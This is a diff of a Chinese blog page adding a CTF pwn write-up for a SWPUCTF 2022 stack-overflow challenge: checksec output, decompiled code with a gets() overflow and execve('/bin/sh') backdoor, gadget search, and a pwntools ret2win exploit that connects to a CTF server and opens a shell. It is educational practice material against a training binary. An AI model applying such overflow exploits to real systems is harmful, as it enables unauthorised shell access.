@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.ghostfoxy.cn/banner/3.png">
 <meta property="article:published_time" content="2025-11-16T12:58:03.000Z">
-<meta property="article:modified_time" content="2025-11-16T16:12:04.029Z">
+<meta property="article:modified_time" content="2025-11-17T02:58:24.942Z">
 <meta property="article:author" content="Gh0stF0xy">
 <meta property="article:tag" content="pwn,题解,write-up">
 <meta name="twitter:card" content="summary_large_image">
@@ -230,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          506 字
+          975 字
         
       </span>
     
@@ -241,7 +241,7 @@
         
         
         
-          5 分钟
+          9 分钟
         
       </span>
     
@@ -292,7 +292,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-11-17T00:12:04+08:00
+                    本文最后更新于 2025-11-17T10:58:24+08:00
                   
                   
 
@@ -360,6 +360,34 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28397</span>)<br>offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span><br>sh_addr = <span class="hljs-number">0x40072c</span><br>ret_addr = <span class="hljs-number">0x40057e</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(ret_addr) + p64(sh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>执行程序拿到shell。</p>
+<h3 id="SWPUCTF-2022-新生赛-有手就行的栈溢出"><a href="#SWPUCTF-2022-新生赛-有手就行的栈溢出" class="headerlink" title="[SWPUCTF 2022 新生赛]有手就行的栈溢出"></a>[SWPUCTF 2022 新生赛]有手就行的栈溢出</h3><p>checksec一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>  RELRO:      Partial RELRO<br>  Stack:      No canary found<br>  NX:         NX enabled<br>  PIE:        No PIE (0x400000)<br>  SHSTK:      Enabled #影子堆栈备份返回地址，函数返回时进行校验，防止ROP攻击<br>  IBT:        Enabled #间接分支跟踪，要求所有简介跳转的目标必须是一条函数指令。防止JOP/COP攻击<br>  Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>64位二进制程序，NX开启，无法使用shellcode。SHSTK和IBT开启，无法使用ROP，JOP和COP攻击</p>
+<p>查看源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(s);<br>  overflow();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">overflow</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE v1[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  gets(v1);<span class="hljs-comment">//危险函数，引发栈溢出</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Are you kidding?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;system(&#x27;/bin/sh&#x27;)&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *argv[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">return</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, argv, <span class="hljs-number">0LL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到main函数调用了overflow函数，该函数包含危险函数gets，会导致引发栈溢出</p>
+<p>存在两个后门：gift和fun。gift是一个假的调用shell的函数，而fun是真的,利用execve调用shell。</p>
+<p>execve系统调用会用新的程序映像完全替换当前进程的内存空间，包括影子栈。这意味着在成功调用execve的瞬间，旧的、受保护的执行环境就被全新的环境所取代，影子栈的防御也就不复存在了，所以当看到有SHSTK保护机制时，利用系统调用execve是一个非常好的策略，本题是拿了一个简单的例子作为举例</p>
+<p>计算偏移量：0x20 + 0x8</p>
+<p>查找fun函数的地址：0x401257</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p fun</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x401257 &lt;fun&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>查找ret地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary pwn --only &quot;ret&quot;<br>Gadgets information<br>============================================================<br>0x000000000040101a : ret<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
+
+<p>查找到地址：0x40101a</p>
+<p>编写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">21716</span>)<br>offset = <span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span><br>fun_addr = <span class="hljs-number">0x401257</span><br>ret_addr = <span class="hljs-number">0x40101a</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(ret_addr) + p64(fun_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行程序，成功拿到了shell</p>
 
                 
               </div>
